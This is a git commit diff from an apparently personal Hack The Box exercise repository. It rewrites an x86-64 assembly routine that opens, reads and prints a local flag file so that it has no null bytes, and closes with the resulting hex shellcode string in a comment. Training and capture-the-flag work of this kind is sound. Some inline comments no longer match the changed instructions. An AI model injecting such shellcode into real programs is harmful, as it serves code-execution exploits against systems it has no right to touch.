9dbfd75882772802fffd6f94f906ec79a40ca0bc
juan-est145 <128648875+juan-est145@users.noreply.github.com>
2025-07-15 09:54:50 +0200

    Finished shellcode exercise and the entire module

--- HTB-excercises/flag/flag.s
+++ HTB-excercises/flag/flag.s
@@ -3,31 +3,35 @@ global _start
 section .text
 _start:
     ; push './flg.txt\x00'
-    push 0              ; push NULL string terminator
+    push rax              ; push NULL string terminator
     mov rdi, '/flg.txt' ; rest of file name
     push rdi            ; push to stack 
     
     ; open('rsp', 'O_RDONLY')
-    mov rax, 2          ; open syscall number
+    mov al, 2          ; open syscall number
     mov rdi, rsp        ; move pointer to filename
-    mov rsi, 0          ; set O_RDONLY flag
+    ;xor rsi, rsi          ; set O_RDONLY flag
     syscall
 
     ; read file
     lea rsi, [rdi]      ; pointer to opened file
     mov rdi, rax        ; set fd to rax from open syscall
-    mov rax, 0          ; read syscall number
-    mov rdx, 24         ; size to read
+    xor rax, rax          ; read syscall number
+    mov dl, 24         ; size to read
     syscall
 
     ; write output
-    mov rax, 1          ; write syscall
-    mov rdi, 1          ; set fd to stdout
-    mov rdx, 24         ; size to read
+    xor rax, rax
+    mov al, 1          ; write syscall
+    xor rdi, rdi
+    mov dil, 1          ; set fd to stdout
+    mov dl, 24         ; size to read
     syscall
 
     ; exit
-    mov rax, 60
-    mov rdi, 0
+    xor rax, rax
+    mov al, 60
+    xor rdi, rdi
     syscall
 
+; shellcode : 5048bf2f666c672e74787457b0024889e70f05488d374889c74831c0b2180f054831c0b0014831ff40b701b2180f054831c0b03c4831ff0f05
